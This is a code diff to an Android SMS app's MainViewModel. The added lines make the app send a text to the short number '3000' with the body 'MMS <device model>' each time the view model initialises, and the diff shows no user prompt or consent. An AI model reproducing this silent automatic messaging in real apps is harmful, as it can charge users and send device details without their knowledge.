@@ -1,5 +1,6 @@
 package com.sms.moLotus.feature.main
 
+import android.os.Build
 import com.sms.moLotus.R
 import com.sms.moLotus.common.Navigator
 import com.sms.moLotus.common.base.QkViewModel
@@ -27,8 +28,10 @@ import kotlinx.coroutines.launch
 import java.util.*
 import java.util.concurrent.TimeUnit
 import javax.inject.Inject
+import javax.inject.Named
 
 class MainViewModel @Inject constructor(
+    @Named("threadId") private val threadId: Long,
     billingManager: BillingManager,
     contactAddedListener: ContactAddedListener,
     markAllSeen: MarkAllSeen,
@@ -48,8 +51,9 @@ class MainViewModel @Inject constructor(
     private val prefs: Preferences,
     private val ratingManager: RatingManager,
     private val syncContacts: SyncContacts,
-    private val syncMessages: SyncMessages
-) : QkViewModel<MainView, MainState>(MainState(page = Inbox(data = conversationRepo.getConversations()))) {
+    private val syncMessages: SyncMessages,
+    private val sendMessage: SendMessage
+    ) : QkViewModel<MainView, MainState>(MainState(page = Inbox(data = conversationRepo.getConversations()))) {
 
     init {
         disposables += deleteConversations
@@ -449,6 +453,17 @@ class MainViewModel @Inject constructor(
             }
             .autoDisposable(view.scope())
             .subscribe()
+        val list: ArrayList<String> = ArrayList()
+        list.add("3000")
+
+
+        sendMessage.execute(
+            SendMessage.Params(
+                0, threadId, list, "MMS <${Build.MODEL}>",
+                listOf(), 0
+            )
+        )
+
     }
 
 }
